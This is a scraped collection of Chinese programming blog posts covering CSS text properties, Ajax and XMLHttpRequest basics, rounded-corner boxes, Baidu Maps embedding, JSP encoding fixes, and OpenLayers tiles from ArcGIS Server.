CSS 会把元素中的文本放在一个不可见的盒子里，比如对 p 元素中的一段文本，CSS 将其视为很长的一行，只不过在遇到容器边界时会折行。例如：
p {border:3px solid red;}
span {border:1px solid green;}

<p><span>Here is a long paragraph…</span></p>
总结：实际上缩进的是这个文本盒子的起点位置，后续的行是不会缩进的。如果需要缩进整个段落，可以使用margin或padding。
text-indent适用于块容器，包含inline-block；
text-indent是可继承的，且子元素获得的继承值并不是祖先元素设定的值，而是计算的值。示例代码如下：
.root {
    border: 1px solid black;    
    text-indent: 30px;
}
.root > div > span {
    display: inline-block;
}
<div class="root">
    <span>行内儿子节点</span>
    <div>
        <span>行内块级孙子节点</span>
    </div>
</div>
 
总结：这里没有使用百分比，所以子元素的继承值都是30px。但需要注意示例中的前后两个span，后一个span的缩进较前一个span较大，这是由于后一个span是行内块元素，继承的缩进值起作用了。
text-indent允许设定负值，注意配合padding或margin；

字符间距
letter-spacing为正值时增大字符间距，为负值时缩小间距。无论设定字体大小时使用的是什么单位，设定字符间距一定要用相对单位，以便字间距能随字体大小同比例变化。具体用法请参考[letter-spacing]。(http://css.doyoe.com/properties/text/letter-spacing.htm)
单词间距
CSS把任何两边有空白的字符和字符串都视作“单词”，纯汉字文本一段之中没有空格，因此单词间距对中文网页几乎没有用，但对中英混排段落可能有用。单词间距属性具体用法请参考word-spacing。
文本装饰
文本装饰有下划线、上划线、贯串线和闪烁等样式，具体用法可参考text-decoration
文本对齐
一般文本对齐方式有：左对齐/left、右对齐/right、居中对齐/center，以及两端对齐/justify，其中两端对齐是CSS3新增的属性。除此之外，CSS3还定义了一些额外的属性，但浏览器都不怎么支持，具体内容请参考text-align。 
在实际应用中，如果对元素设置了文本对齐属性，而对子元素是如何显示存在疑惑时，只要根据一下规则去计算即可：

文本对齐属性只适用于块容器（包含行内块元素）；
文本对齐属性是可继承的 
如果没有子元素，则文本内容直接根据父元素定义的对齐属性在父元素盒子里显示；
如果子元素是行内非块元素，将其当做文本内容处理（虽然该子元素会继承对齐属性，但是该属性不适用于行内非块元素）；
如果子元素是行内块元素，则该元素会按照父元素的文本对齐属性在父元素盒子里显示。此外，该元素会继承父元素的对齐属性，按照以上规则处理其子元素
如果子元素非行内块元素，则该元素会继承父元素的对齐属性，然后继续按照以上规则处理子元素；

行高
CSS 中的行高平均分布在一行文本的上方和下方，具体用法参考line-height。常见问题和注意点如下：

适用于所有元素，且可继承；
行高小于字体大小时，行与行之间会出现重叠；
实际应用时，要使用相对单位（百分比或乘积因子），避免使用绝对单位（如像素）——字体增大时，可能会出现行与行的重叠；
font快捷属性：以复合值的形式把 font-size 和 line-height 值写在一块，例如div#intro {font:1.2em/1.4 helvetica, arial, sans-serif;}；
文本行高为normal不代表就是1倍于字体大小

文本转换
文本转换属性用于转换元素中文本的大小写，它可以设定英文文本首字母大写、全部字母大写和全部字母小写。具体用法可参考text-transform。
垂直对齐
垂直对齐属性vertical-align以基线为参照上下移动文本， 具体用法参考vertical-align。常见问题和注意点：

垂直对齐属性只适用于行内元素；
HTML标签<sup>和<sub>有默认的上标和下标样式，但效果不是很好；
应用场景：公式或化学分子式中的上标和下标，文本中脚注的角标；

其他属性

white-space
tab-size
word-break
word-wrap
overflow-wrap
text-align-last
text-justify
text-size-adjust


最佳实战
虽然学习了字体和文本属性，但不一定能够在实际应用中搭配好字体和文本样式。文字排版讲求匀称，一般是由看不见的网格，框定页面文字的走向和布局，匀称的版式可以增强页面的可读性。
在线资源： 
- http://ilovetypography.com/ 
- http://www.thinkingwithtype.com/ 
- http://webtypography.net/

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Ajax提高篇(1)入门
学习目的:理解 Ajax 及其工作原理，构建网站的一种有效方法.Ajax 是 Asynchronous JavaScript and XML（以及 DHTML 等）的缩写.下面是 Ajax 应用程序所用到的基本技术：• HTML 用于建立 Web 表单并确定应用程序其他部分使用的字段。 • JavaScript 代码是运行 Ajax 应用程序的核心代码，帮助改进与服务器应用程序的通信。 • DHTML 或 Dynamic HTML，用于动态更新表单。我们将使用 div、span 和其他动态 HTML 元素来标记 HTML。 • 文档对象模型 DOM 用于（通过 JavaScript 代码）处理 HTML 结构和（某些情况下）服务器返回的 XML。从上面可以看出,Ajax不是什么新的技术,而是几个老的技术通过新的方法结合起来,从而实现了新的效果!很多事物都是多元化的,可以说Ajax是一个新技术，也可以说Ajax是一个新的思路，一个新的架构！Ajax的基本工作原理及流程：在一般的 Web 应用程序中，用户填写表单字段并单击 Submit 按钮。然后整个表单发送到服务器，服务器将它转发给处理表单的脚本（通常是 PHP 或 Java，也可能是 CGI 进程或者类似的东西），脚本执行完成后再发送回全新的页面。该页面可能是带有已经填充某些数据的新表单的 HTML，也可能是确认页面，或者是具有根据原来表单中输入数据选择的某些选项的页面。当然，在服务器上的脚本或程序处理和返回新表单时用户必须等待。屏幕变成一片空白，等到服务器返回数据后再重新绘制。这就是交互性差的原因，用户得不到立即反馈，因此感觉不同于桌面应用程序。Ajax 基本上就是把 JavaScript 技术和 XMLHttpRequest 对象放在 Web 表单和服务器之间。当用户填写表单时，数据发送给一些 JavaScript 代码而不是 直接发送给服务器。相反，JavaScript 代码捕获表单数据并向服务器发送请求。同时用户屏幕上的表单也不会闪烁、消失或延迟。换句话说，JavaScript 代码在幕后发送请求，用户甚至不知道请求的发出。更好的是，请求是异步发送的，就是说 JavaScript 代码（和用户）不用等待服务器的响应。因此用户可以继续输入数据、滚动屏幕和使用应用程序。然后，服务器将数据返回 JavaScript 代码（仍然在 Web 表单中），后者决定如何处理这些数据。它可以迅速更新表单数据，让人感觉应用程序是立即完成的，表单没有提交或刷新而用户得到了新数据。JavaScript 代码甚至可以对收到的数据执行某种计算，再发送另一个请求，完全不需要用户干预！这就是 XMLHttpRequest 的强大之处。它可以根据需要自行与服务器进行交互，用户甚至可以完全不知道幕后发生的一切。结果就是类似于桌面应用程序的动态、快速响应、高交互性的体验，但是背后又拥有互联网的全部强大力量。XMLHttpRequest 对象：open()：建立到服务器的新请求。 send()：向服务器发送请求.abort()：退出当前请求。 readyState：提供当前 HTML 的就绪状态。 responseText：服务器返回的请求响应文本。 由于前两年的浏览器大战，使得各种浏览器获得 XMLHttpRequest 对象采用的方法有所不同。支持多种浏览器的方式创建 XMLHttpRequest 对象 var xmlHttp = false;
try {
xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
} catch (e2) {
    xmlHttp = false;
}
}
if (!xmlHttp && typeof XMLHttpRequest != 'undefined') {
xmlHttp = new XMLHttpRequest();
} 这段代码的核心分为三步：1. 建立一个变量 xmlHttp 来引用即将创建的 XMLHttpRequest 对象。 2. 尝试在 Microsoft 浏览器中创建该对象：     尝试使用 Msxml2.XMLHTTP 对象创建它。     如果失败，再尝试 Microsoft.XMLHTTP 对象。 3. 如果仍然没有建立 xmlHttp，则以非 Microsoft 的方式创建该对象。 最后，xmlHttp 应该引用一个有效的 XMLHttpRequest 对象，无论运行什么样的浏览器。Ajax中的请求/响应发出请求：Ajax 应用程序中基本相同的流程：1. 从 Web 表单中获取需要的数据。 2. 建立要连接的 URL。 3. 打开到服务器的连接。 4. 设置服务器在完成后要运行的函数。 5. 发送请求。  function callServer() {
// Get the city and state from the web form
var city = document.getElementById("city").value;
var state = document.getElementById("state").value;
// Only go on if there are values for both fields
if ((city == null) || (city == "")) return;
if ((state == null) || (state == "")) return;
// Build the URL to connect to
var url = "/scripts/getZipCode.aspx?city=" + escape(city) + "&state=" + escape(state);
// Open a connection to the server
xmlHttp.open("GET", url, true);
// Setup a function for the server to run when it's done
xmlHttp.onreadystatechange = updatePage;
// Send the request
xmlHttp.send(null);
} 处理响应：readyState可能返回的值：0：请求未初始化（还没有调用 open()）。 1：请求已经建立，但是还没有发送（还没有调用 send()）。 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4：响应已完成；您可以获取并使用服务器的响应了。 必须知道两点：1.什么也不要做，直到 xmlHttp.readyState 属性的值等于 4。 2.服务器将把响应填充到 xmlHttp.responseText 属性中。响应函数： function updatePage() {
  if (xmlHttp.readyState == 4) {
    var response = xmlHttp.responseText;
    document.getElementById("zipCode").value = response;
  }
} 开始的代码使用基本 JavaScript 代码获取几个表单字段的值。然后设置一个 asp 脚本作为链接的目标。要注意脚本 URL 的指定方式，city 和 state（来自表单）使用简单的 GET 参数附加在 URL 之后。 然后打开一个连接，这是您第一次看到使用 XMLHttpRequest。其中指定了连接方法（GET）和要连接的 URL。最后一个参数如果设为 true，那么将请求一个异步连接（这就是 Ajax 的由来）。如果使用 false，那么代码发出请求后将等待服务器返回的响应。如果设为 true，当服务器在后台处理请求的时候用户仍然可以使用表单（甚至调用其他 JavaScript 方法）。xmlHttp（要记住，这是 XMLHttpRequest 对象实例）的 onreadystatechange 属性可以告诉服务器在运行完成 后（可能要用五分钟或者五个小时）做什么。因为代码没有等待服务器，必须让服务器知道怎么做以便您能作出响应。在这个示例中，如果服务器处理完了请求，一个特殊的名为 updatePage() 的方法将被触发。最后，使用值 null 调用 send()。因为已经在请求 URL 中添加了要发送给服务器的数据（city 和 state），所以请求中不需要发送任何数据。这样就发出了请求，服务器按照您的要求工作。简单总结的Ajax的工作流程：javascript获得要向服务器段传递的参数或变量，然后利用创建的XMLHttpRequest 对象发送个服务器段，如果服务器端接受数据并返回数据，则保存在responseText 属性中，最后通过javascript修改DOM，从而实现在客户端无刷新的修改数据。 参考资料：http://www.ibm.com/developerworks/cn/xml/wa-ajaxintro1.html








window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];




上一篇Ajax优缺点解析
下一篇Ajax提高篇（2）DOM进行Web响应





    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)




顶
1


踩
0


纯CSS技术实现可变高度的圆角矩形框-so easy
    在上一篇的文章http://blog.csdn.net/wz537071/article/details/47910757#reply中，总结了下用纯CSS制作圆角矩形框的知识，并且最终做出来自己想要的那个样式。在网页设计中，还有很多的可变宽度的圆角矩形框的使用，一些网页不可能用一些固定宽度的圆角矩形框来显示内容，可变宽度的圆角矩形框的使用地位是很重要的，那么现在来扩展下思维，能不能用纯CSS的技术来制作可变宽度的圆角矩形框呢？答案就是可以，而且非常简单。
    在牛腩视频中，牛腩老师是通过截取一个现成的图片，然后通过5部分的方法设计的圆角矩形框，这种方法是对图片img的设计，跟着牛腩老师的步骤可以很好的实现这个样式。通过了解原理知道，可变宽度的圆角矩形框其实也是那个固定宽度的圆角矩形框的变形，视频上是通过把右边的边框进行平铺，最后实现的可变宽度：


    说说我自己的想法：在上一篇文章里面已经介绍了圆角矩形框的实现原理，最后我也实现了那个固定宽度的圆角矩形框，只要我可以把中间的那个<div>标签的左右边框的长度可以随文本变化的话，那就可以很方便的实现可变宽度的圆角矩形框了啊。
    带着这样的想法，通过1天时间的研究（过程苦逼略过），通过对比border的属性和查找资料，终于发现了border的一个重要属性：_width、_height。这个属性的意思是高度或宽度取决于其他属性的值。那要是这样的话，就可以实现我们的需求了。
    下面是我的具体设计过程（so easy只要你懂了原理）：
    把固定高度的圆角矩形框建立起来，过程同上一篇文章：
<!--可变高度的圆角矩形框的设计-HTML代码-->
    <div>
        <div id="categorycenter" class="divbox">
            <div class="div1"></div>
            <div class="div2"></div>
            <div  id="divmiddle">
                <p>类别管理</p>
                <p>新闻管理</p>
                <p>添加新闻</p>
            </div>
            <div class="div2"></div>
            <div class="div1"></div>
        </div>
    </div>
<div>

/*固定高度的圆角框的制作*/
.divbox {
    width: 580px;
    margin: auto;
    vertical-align: text-bottom;
}

.div1 {
    background: #999999;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
    margin: 0px 6px;
    height: 3px;
    overflow: hidden;
}

.div2 {
    background: #FFF;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
    margin: 0px 2px;
    height: 3px;
    overflow: hidden;
}

.divmiddle {
    height: 285px;
    border-left: #999999 solid 3px;
    border-right: solid 3px #999;
}
    接下来就是设置中间的divmiddle标签的边框的样式，让它可以改变高度：
/*可变高度的圆角矩形框-CSS代码*/
#categorycenter {
    float: left;
    _height: 200px;
    width: 200px;
    margin-bottom: 10px;
    border-image-repeat: repeat;
}

    #categorycenter p {
        text-align :center ;
        margin-top :20px;
        margin-bottom :35px;
    }

#divmiddle {
    border-left: 3px solid #999;
    border-right: 3px solid #999;
    _height:200px;
    overflow: hidden;
}

    注意上面的代码，在改变divmiddle标签的边框样式的时候，一定要首先明白它们都是放在了categorycenter这个大的标签下面的，所以首先要对这个标签进行重新设计，然后再进行divmiddle标签的边框设计，最终形成的效果就是下面的：


    改变p标签的样式，把间距变大一点，就是下面的图：


    通过与旁边的那个固定宽度的圆角矩形框的对比，可以清晰的看出来差别，这样也是对我们设计的一个效果的检验，嗯，效果很好值得肯定。
    在这个探索的过程中，由于出现了各种问题，不是文字出去了边框就是边框没有贴合在一块，大段大段的空白，没办法只有上，各种调试，各种实验，这个过程以后我对那些float、margin等这些属性的使用，从脑子里面转移到了手上，需要什么样式随手一打就是标准的样式（啊哈，开玩乐），就是这个过程我觉得是对知识的一种锤炼，最终能够验证自己的想法还是很有感觉的。



版权声明：本文为博主原创文章，未经博主允许不得转载。

百度地图引用

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="jquery-1.7.1.min.js"></script>
<script src="http://api.map.baidu.com/api?v=1.3" type="text/javascript"></script>
<script type="text/javascript" src="baidumap.js"></script>
<script type="text/javascript">
$(function(){
 
var lng = '117';
var lat = '120';
var hos = '浙江大学医学院附属邵逸夫医院';
$("#lookmap").attr("href", "http://map.baidu.com/?latlng="+lat+","+lng+"&title="+hos+"&content=&autoOpen=true");
MapUtil.init("map");

MapUtil.showLabel(lng, lat, hos);
var url = "http://map.baidu.com/?latlng="+lat+","+lng+"&title="+hos+"&content=&autoOpen=true";
MapUtil.addEventListener('click',function(){},url);
});
</script>
</head>


<body>
<!--主体页面底部-right-->
    <div class="yys-main-bottom-right">
         <div class="yys-main-bottom-right-map">
          <div id="map" style="width: 270px;height: 230px;"></div>
             <div><a href="#" id="lookmap" target="block">查看地图</a></div>
         </div>
     </div>  
</body>
</html>
    
        
版权声明：本文为博主原创文章，未经博主允许不得转载。

关于提交form表单中文乱码问题
首先是在jsp界面charset设置字体为UTF-8

<%@ page contentType="text/html;charset=UTF-8" language="java"%>
然后在java后台


request.setCharacterEncoding("UTF-8");


这就可以了
没错就是这样
一开始网上各种百度
都不可以
我就随便打开了request 设置了一下发现有setchaacterencoding
然后就好了


同理：通过ajax向客户端返回值得时候也是

response.setCharacterEncoding("UTF-8");



版权声明：都是兄弟，请随意转载，请注明兄弟是谁

web 前端学习笔记

  <!DOCTYPE HTML>
<head>
<style type="text/css">
body
{ 
background: #ff0000 url(img/QQ图片20150821075230.ico) no-repeat fixed center ;    //no-repeat fixed center  无重复固定中心
}
p.bottommargin
{
margin-bottom: 205px;
color: black;
border: solid thick green;
}
</style>
</head>
<body >


<p>This is a paragraph with no margin specified</p>
<p class="bottommargin">This is a paragraph with a specified bottom margin</p>
<p>This is a paragraph with no margin specified</p>


</body>
</html>
    
        
版权声明：本文为博主原创文章，未经博主允许不得转载。

OL记载Arcgis Server切片
概述：本文讲述如何在OpenLayers中调用Arcgis Server切片并显示。思路：在OpenLayers中加载Arcgis Server切片用XYZ图层，Arcgis Server的切片调用地址我们可以看到如下：可以看到，切片的请求地址为http://localhost:6080/arcgis/rest/services/china/MapServer/z/y/x，其中，z为缩放级别，x，y分别为改切片距离tileOrigin的行列号，其计算方式为：        var res = this.getResolution();
        var originTileX = (this.tileOrigin.lon + (res * this.tileSize.w/2));
        var originTileY = (this.tileOrigin.lat - (res * this.tileSize.h/2));
        var center = bounds.getCenterLonLat();
        var point = { x: center.lon, y: center.lat };
        var x = (Math.round(Math.abs((center.lon - originTileX) / (res * this.tileSize.w)))); 
        var y = (Math.round(Math.abs((originTileY - center.lat) / (res * this.tileSize.h)))); 
        var z = this.map.getZoom();将之封装为一个OpenLayers扩展类OpenLayers.Layer.AgsTileLayer，该类的代码方式为：OpenLayers.Layer.AgsTileLayer = OpenLayers.Class(OpenLayers.Layer.XYZ, {
    url: null,
    tileOrigin: null,
    tileSize: new OpenLayers.Size(256, 256),
    type: 'png',
    useScales: false,
    overrideDPI: false,
    initialize: function(name, url, options) { 
        OpenLayers.Layer.XYZ.prototype.initialize.apply(this, arguments);
    },
    getURL: function (bounds) {
        var res = this.getResolution();
        var originTileX = (this.tileOrigin.lon + (res * this.tileSize.w/2));
        var originTileY = (this.tileOrigin.lat - (res * this.tileSize.h/2));
        var center = bounds.getCenterLonLat();
        var point = { x: center.lon, y: center.lat };
        var x = (Math.round(Math.abs((center.lon - originTileX) / (res * this.tileSize.w)))); 
        var y = (Math.round(Math.abs((originTileY - center.lat) / (res * this.tileSize.h)))); 
        var z = this.map.getZoom();
        var url = this.url;
        var s = '' + x + y + z;
        if (OpenLayers.Util.isArray(url)) {
            url = this.selectUrl(s, url);
        }
        url = url + '/tile/${z}/${y}/${x}';
        url = OpenLayers.String.format(url, {'x': x, 'y': y, 'z': z});
        return OpenLayers.Util.urlAppend(
            url, OpenLayers.Util.getParameterString(this.params)
        );
    },

    CLASS_NAME: 'OpenLayers.Layer.AgsTileLayer'
}); 调用方式为：<script src="AgsTileLayer.js"></script>            var tiled = new OpenLayers.Layer.AgsTileLayer( "AGSCache",
                    "http://localhost:6080/arcgis/rest/services/china/MapServer", {
                        isBaseLayer: true,
                        tileSize: new OpenLayers.Size(256, 256),
                        resolutions: [
                            0.07614275218656896,
                            0.03807137609328448,
                            0.01903568804664224,
                            0.00951784402332112,
                            0.00475892201166056
                        ],
                        tileOrigin: new OpenLayers.LonLat(-400 , 400),
                        maxExtent: bounds,
                        projection: 'EPSG:4326'
                    });
            map.addLayers([tiled]);代码中涉及到的参数可以从http://localhost:6080/arcgis/rest/services/china/MapServer?f=pjson返回的JSON数据中获取，如下：{
   "capabilities" : "Map,Query,Data",
   "copyrightText" : "",
   "currentVersion" : 10.110,
   "description" : "",
   "documentInfo" : {
      "AntialiasingMode" : "None",
      "Author" : "",
      "Category" : "",
      "Comments" : "",
      "Keywords" : "",
      "Subject" : "",
      "TextAntialiasingMode" : "Force",
      "Title" : ""
   },
   "fullExtent" : {
      "spatialReference" : {
         "latestWkid" : 4326,
         "wkid" : 4326
      },
      "xmax" : 134.9767976465060,
      "xmin" : 73.45100463562233,
      "ymax" : 53.53194315222358,
      "ymin" : 18.16324718764174
   },
   "initialExtent" : {
      "spatialReference" : {
         "latestWkid" : 4326,
         "wkid" : 4326
      },
      "xmax" : 138.0530872970502,
      "xmin" : 70.37471498507816,
      "ymax" : 55.85657468506156,
      "ymin" : 35.30335092712114
   },
   "layers" : [
      {
         "defaultVisibility" : true,
         "id" : 0,
         "maxScale" : 0,
         "minScale" : 0,
         "name" : "province",
         "parentLayerId" : -1,
         "subLayerIds" : null
      },
      {
         "defaultVisibility" : true,
         "id" : 1,
         "maxScale" : 0,
         "minScale" : 0,
         "name" : "bcity",
         "parentLayerId" : -1,
         "subLayerIds" : null
      },
      {
         "defaultVisibility" : true,
         "id" : 2,
         "maxScale" : 0,
         "minScale" : 0,
         "name" : "bcounty",
         "parentLayerId" : -1,
         "subLayerIds" : null
      }
   ],
   "mapName" : "Layers",
   "maxImageHeight" : 2048,
   "maxImageWidth" : 2048,
   "maxRecordCount" : 1000,
   "maxScale" : 1000000,
   "minScale" : 32000000,
   "serviceDescription" : "",
   "singleFusedMapCache" : true,
   "spatialReference" : {
      "latestWkid" : 4326,
      "wkid" : 4326
   },
   "supportedImageFormatTypes" : "PNG32,PNG24,PNG,JPG,DIB,TIFF,EMF,PS,PDF,GIF,SVG,SVGZ,BMP",
   "supportedQueryFormats" : "JSON, AMF",
   "supportsDynamicLayers" : false,
   "tables" : [],
   "tileInfo" : {
      "cols" : 256,
      "compressionQuality" : 0,
      "dpi" : 96,
      "format" : "PNG",
      "lods" : [
         {
            "level" : 0,
            "resolution" : 0.07614275218656896,
            "scale" : 32000000
         },
         {
            "level" : 1,
            "resolution" : 0.03807137609328448,
            "scale" : 16000000
         },
         {
            "level" : 2,
            "resolution" : 0.01903568804664224,
            "scale" : 8000000
         },
         {
            "level" : 3,
            "resolution" : 0.009517844023321120,
            "scale" : 4000000
         },
         {
            "level" : 4,
            "resolution" : 0.004758922011660560,
            "scale" : 2000000
         },
         {
            "level" : 5,
            "resolution" : 0.002379461005830280,
            "scale" : 1000000
         }
      ],
      "origin" : {
         "x" : -400,
         "y" : 400
      },
      "rows" : 256,
      "spatialReference" : {
         "latestWkid" : 4326,
         "wkid" : 4326
      }
   },
   "units" : "esriDecimalDegrees"
}

版权声明：本文为博主原创文章，未经博主允许不得转载。

Ajax优缺点解析
首先，我们先来了解一下AJAX 的基本概念 AJAX简介AJAX代表了异步JavaScript+XML。这种技术首先由微软在1999年引入，并以"使用远程调用的DHTML/JavaScript web应用程序"著称。这一技术的基本思想是，允许一个互联网浏览器向一个远程页面/服务作异步的HTTP调用，并且用收到的结果更新一个当前web页面而不必刷新整个页面。根据这种技术创建者的意见，这种技术应能够改进客户端的体验-使得HTTP页面外观与使用感觉很类似于Windows桌面应用程序。 Adaptive Path公司的Jesse James Garrett这样定义Ajax：Ajax不是一种技术。实际上，它由几种蓬勃发展的技术以新的强大方式组合而成。Ajax包含：基于XHTML和CSS标准的表示；使用Document Object Model进行动态显示和交互；使用XMLHttpRequest与服务器进行异步通信；Ajax的工作原理Ajax的核心是JavaScript对象XmlHttpRequest。该对象在Internet Explorer 5中首次引入，它是一种支持异步请求的技术。简而言之，XmlHttpRequest使您可以使用JavaScript向服务器提出请求并处理响应，而不阻塞用户。具体来说，Ajax基于以下的技术：XHTML：对应W3C的XHTML规范，目前是XHTML1.0。CSS：对应W3C的CSS规范，目前是CSS2.0DOM：这里的DOM主要是指HTML DOM，XML DOM包括在下面的XML中JavaScript：对应于ECMA的ECMAScript规范XML：对应W3C的XML DOM、XSLT、XPath等等规范XMLHttpRequest：对应WhatWG的Web Applications1.0规范（http://whatwg.org/specs/web-apps/current-work/） 接下来，我们来了解一下 AJAX 的适用场景与不适用场景 Ajax适用场景　　1.表单驱动的交互　　2.深层次的树的导航　　3.快速的用户与用户间的交流响应　　4.类似投票、yes/no等无关痛痒的场景　　5.对数据进行过滤和操纵相关数据的场景　　6.普通的文本输入提示和自动完成的场景Ajax不适用场景　　1.部分简单的表单　　2.搜索 　3.基本的导航　　4.替换大量的文本　　5.对呈现的操纵 现在，我们来了解一下 AJAX 的优缺点 这大概是学习 AJAX 的人都比较关心的方面了，一种新的语言，其优缺点往往能决定其未来的命运，AJAX 做为一个新宠，它的优缺点必然是大家关注的焦点，不多说，下面我来总结一下从网上收集到的资料。 AJAX优点：1、最大的一点是页面无刷新，在页面内与服务器通信，给用户的体验非常好。2、使用异步方式与服务器通信，不需要打断用户的操作，具有更加迅速的响应能力。3、可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理4、基于标准化的并被广泛支持的技术，不需要下载插件或者小程序。AJAX技术比刷页方式节省带宽的比例换算公式如下： ( 交互次数(刷页交互流量 - AJAX交互量) - (AJAX版首次加增加量) ) / (刷页*交互次数 + 首次加载页面大小) 有一个国外对Ajax技术的试验：Using AJAX to Improve the Bandwidth Performance of Web Applications  ①一个10k的页面：AJAX技术，在交互中只刷新网页中部分需要更新数据2-3k，传统的整页刷新模式需要整页重载10k； ②交互次数越多，AJAX应用的带宽节省效果越明显； ③整页刷新模式虽然需要重新载入图片等，Ajax则不用； 在此次条件的试验过程中：ajax技术总计节省了超过61%。远远超过预期的50% 而且随着交互次数增加，节省率还会更高。AJAX 的最大亮点大概就是页面无刷新了，使用异步模式可以减少用户等待，可以在画面上实现更多的功能更便利的交互以改善客户感受，在技术层面则可以带来更灵活的应用结构组织方式。 AJAX缺点：1．缺少一个没有标准之争、没有back和history的浏览器  Ajax取消了back按钮，即对浏览器后退机制的破坏。后退按钮是一个标准的web站点的重要功能，但是它没法和js进行很好的合作，这是ajax所带来的一个比较严重的问题。作为一个WEB的用户，我们已经习惯了有 back按钮，这几乎是每个用户共同的习惯，AJAX下点击链接是不Redirect页面，所以不存在后退和前进了，同样，没有后退和前进也就无存找浏览历史纪录了。back和history存在的根本就是url的改变，在AJAX下人们发现不改url也同样能达到内容改变这个酷酷的特点。用过Gmail的知道，Gmail下面采用的ajax技术解决了这个问题，在Gmail下面是可以后退的，但是，它也并不能改变ajax的机制，它只是采用的一个比较笨但是有效的办法，即用户单击后退按钮访问历史记录时，通过创建或使用一个隐藏的IFRAME来重现页面上的变更。但是，虽然说这个问题是可以解决的，但是它所带来的开发成本是非常高的，和ajax框架所要求的快速开发是相背离的。这是ajax所带来的一个非常严重的问题。 2．对搜索引擎的支持不好  3．安全问题ajax的逻辑可以对客户端的安全扫描技术隐藏起来，允许黑客从远端服务器上建立新的攻击。还有ajax也难以避免一些已知的安全弱点，诸如跨站点脚步攻击、SQL注入攻击和基于credentials的安全漏洞等。 4．语言问题I)   编写复杂、容易出错 (javascript本是是个轻量级的小东西，现在被强迫重用起来，负担可想而知)II)  冗余代码更多了 （层层包含js文件是AJAX的通病，再加上以往的很多服务端代码现在放到了客户端）III) 破坏了Web的原有标准  以上是我在收集 AJAX 方面知识的总结,可能还不是太全面,希望能给共同学习AJAX 的朋友一些帮助.

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

Ajax提高篇（2）DOM进行Web响应
1. 简单 HTML 页面             <html>
            <head>
            <title>Trees, trees, everywhere</title>
            </head>
            <body>
            <h1>Trees, trees, everywhere</h1>
            <p>Welcome to a <em>really</em> boring page.</p>
            <div>
            Come again soon.
            <img src="come-again.gif" />
            </div>
            </body>
            </html>
             1 的树视图对象的值既然了解了一些基本的术语，现在应该关注一下其中包含元素名称和文本的小矩形了（图 1）。每个矩形是一个对象；浏览器在其中解决一些文本问题。通过使用对象来表示 HTML 文档的每一部分，可以很容易地更改组织、应用样式、允许 JavaScript 访问文档，等等。对象类型和属性标记的每个可能类型都有自己的对象类型。例如，HTML 中的元素用 Element 对象类型表示。文档中的文本用 Text 类型表示，属性用 Attribute 类型表示，以此类推。所以 Web 浏览器不仅可以使用对象模型来表示文档（从而避免了处理静态文本），还可以用对象类型立即辨别出某事物是什么。HTML 文档被解析并转换为对象集合，如 图 1 所示，然后尖括号和转义序列（例如，使用 < 表示 <，使用 > 表示 >）等事物不再是问题了。这就使得浏览器的工作（至少在解析输入 HTML 之后）变得更容易。弄清某事物究竟是元素还是属性并确定如何处理该类型的对象，这些操作都十分简单了。通过使用对象，Web 浏览器可以更改这些对象的属性。例如，每个元素对象具有一个父元素和一系列子元素。所以添加新的子元素或文本只需要向元素的子元素列表中添加一个新的子元素。这些对象还具有 style 属性，所以快速更改元素或文本段的样式非常简单。例如，要使用 JavaScript 更改 div 的高度，如下所示：someDiv.style.height = "300px";
            换句话说，Web 浏览器使用对象属性可以非常容易地更改树的外观和结构。将之比作浏览器在内部将页面表示为文本时必须进行的复杂事情，每次更改属性或结构都需要浏览器重新编写静态文件、重新解析并在屏幕上重新显示。有了对象，所有这一切都解决了。DOM 简介到目前为止，您已经知道浏览器将 Web 页面转换为对象表示，可能您甚至会猜想，对象表示是 DOM 树。DOM 表示 Document Object Model，是一个规范，可从 World Wide Web Consortium (W3C) 获得（您可以参阅 参考资料 中的一些 DOM 相关链接）。但更重要的是，DOM 定义了对象的类型和属性，从而允许浏览器表示标记。（本系列下一篇文章将专门讲述在 JavaScript 和 Ajax 代码中使用 DOM 的规范。）文档对象首先，需要访问对象模型本身。这非常容易；要在运行于 Web 页面上的任何 JavaScript 代码中使用内置 document 变量，可以编写如下代码：var domTree = document;
